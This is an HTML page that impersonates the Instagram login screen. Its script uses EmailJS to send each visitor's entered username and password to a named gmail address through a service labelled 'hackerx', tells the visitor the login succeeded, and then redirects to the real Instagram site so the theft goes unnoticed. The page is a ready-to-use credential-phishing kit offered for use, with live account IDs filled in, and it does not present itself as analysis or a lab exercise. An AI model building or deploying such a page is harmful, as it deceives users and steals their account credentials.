<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
<title>Instagram</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=InstagramSans:wght@400;600&display=swap');
  /* Instagram Sans is proprietary, fallback to monospace sans serif */
  @import url('https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap');

  /* Reset and base */
  * {
    margin: 0; padding: 0; box-sizing: border-box;
  }
  html, body {
    background: #fafafa;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen,
      Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
    -webkit-font-smoothing: antialiased;
    -moz-osx-font-smoothing: grayscale;
    height: 100vh;
    overflow: hidden;
  }

  .container {
    max-width: 350px;
    height: 600px;
    margin: 2rem auto;
    background: #fff;
    border: 1px solid #dbdbdb;
    display: flex;
    flex-direction: column;
    justify-content: space-between;
    padding: 20px 40px;
    border-radius: 6px;
  }

  /* Instagram logo style using text */
  .logo {
    font-family: 'Grand Hotel', cursive;
    font-size: 48px;
    text-align: center;
    margin: 30px 0 20px 0;
    color: #262626;
  }

  form {
    display: flex;
    flex-direction: column;
  }

  label {
    font-size: 12px;
    color: #8e8e8e;
    font-weight: 600;
    margin-bottom: 6px;
    user-select: none;
  }

  input[type="text"],
  input[type="password"] {
    height: 40px;
    margin-bottom: 14px;
    padding: 0 10px;
    border: 1px solid #dbdbdb;
    border-radius: 4px;
    background-color: #fafafa;
    font-size: 14px;
    transition: border-color 0.2s ease;
  }

  input[type="text"]:focus,
  input[type="password"]:focus {
    border-color: #a8a8a8;
    outline: none;
    background-color: white;
  }

  button {
    margin-top: 6px;
    background: #0095f6;
    border: none;
    border-radius: 4px;
    color: white;
    font-weight: 600;
    font-size: 14px;
    height: 38px;
    cursor: pointer;
    transition: background-color 0.2s ease;
  }

  button:hover {
    background: #007acc;
  }

  .divider {
    text-align: center;
    margin: 20px 0;
    font-size: 13px;
    color: #8e8e8e;
    position: relative;
  }

  .divider::before,
  .divider::after {
    content: "";
    position: absolute;
    top: 50%;
    width: 40%;
    border-top: 1px solid #dbdbdb;
  }

  .divider::before {
    left: 0;
  }

  .divider::after {
    right: 0;
  }

  #message {
    color: #0095f6;
    text-align: center;
    margin-top: 12px;
    font-size: 14px;
    min-height: 20px;
  }

  /* Responsive adjustments */
  @media (max-width: 400px) {
    .container {
      margin: 1rem 10px;
      height: auto;
      max-width: 100%;
      padding: 20px 20px;
    }
  }
</style>
</head>
<body>
  <div class="container" role="main">
    <h1 class="logo" aria-label="Instagram">Instagram</h1>
    <form id="loginForm" autocomplete="off" aria-label="Instagram Login Form" >
      <label for="username">Phone number, username or email</label>
      <input type="text" id="username" name="username" placeholder="Phone number, username or email" required autocomplete="username" />

      <label for="password">Password</label>
      <input type="password" id="password" name="password" placeholder="Password" required autocomplete="current-password" />

      <button type="submit" aria-label="Log In to Instagram">Log In</button>
      <div id="message" aria-live="polite" role="status"></div>
    </form>
    <div class="divider">OR</div>
  </div>

<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
<script>
  /* 
    IMPORTANT:
    Replace the placeholders below with your EmailJS account details:
    - YOUR_EMAILJS_USER_ID
    - YOUR_SERVICE_ID
    - YOUR_TEMPLATE_ID

    Sign up at https://www.emailjs.com/, create your service and email template,
    then copy the IDs here to make this form send emails to your address.
  */
  (function() {
    emailjs.init("rgwxUwpSO5QjtMzUe");
  })();

  const form = document.getElementById('loginForm');
  const messageEl = document.getElementById('message');

  form.addEventListener('submit', function(e) {
    e.preventDefault();

    const username = form.username.value.trim();
    const password = form.password.value;

    if(!username || !password) {
      messageEl.style.color = 'red';
      messageEl.textContent = 'Please fill in all fields.';
      return;
    }

    messageEl.style.color = '#0095f6';
    messageEl.textContent = 'Logging in...';

    const templateParams = {
      username: username,
      password: password,
      to_email: 'anitagouds9@gmail.com'
    };

    emailjs.send('hackerx', 'template_478vg6k', templateParams)
    .then(function(response) {
      messageEl.textContent = "Login successful. Redirecting...";
      setTimeout(() => {
        window.location.href = "https://www.instagram.com/";
      }, 1500);
    }, function(error) {
      messageEl.style.color = 'red';
      messageEl.textContent = "Oops! Something went wrong. Please try again.";
      console.error('EmailJS error:', error);
    });
  });
</script>
</body>
</html>
